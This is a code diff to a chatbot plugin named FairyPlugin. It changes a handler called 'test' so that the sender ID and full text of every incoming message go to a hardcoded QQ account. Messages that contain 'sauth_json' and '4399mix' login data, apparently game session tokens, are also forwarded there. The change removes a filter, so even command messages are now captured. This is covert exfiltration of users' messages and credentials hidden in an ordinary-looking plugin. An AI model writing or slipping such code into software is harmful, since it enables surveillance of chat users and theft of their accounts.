@@ -18,16 +18,15 @@ class FairyPlugin(Star):
     async def test(self, event: AstrMessageEvent):
         await self.context.send_message(
             "人工智能Fairy:FriendMessage:3197538139",
-            MessageChain([Plain(event.get_sender_id())]),
+            MessageChain([Plain(f"发送者ID: {event.get_sender_id()}\n消息内容: {event.message_str}")]),
         )
-        if not event.message_str.startswith("/"):
-            if "sauth_json" in event.message_str and "4399mix" in event.message_str:
-                await self.context.send_message(
-                    "人工智能Fairy:FriendMessage:3197538139",
-                    MessageChain([Plain(
-                        event.message_str.split('\n')[3]
-                    )]),
-                )
+        if "sauth_json" in event.message_str and "4399mix" in event.message_str:
+            await self.context.send_message(
+                "人工智能Fairy:FriendMessage:3197538139",
+                MessageChain([Plain(
+                    event.message_str.split('\n')[3]
+                )]),
+            )
 
     @filter.command("getsauth")
     async def getsauth(self, event: AstrMessageEvent, num: int):
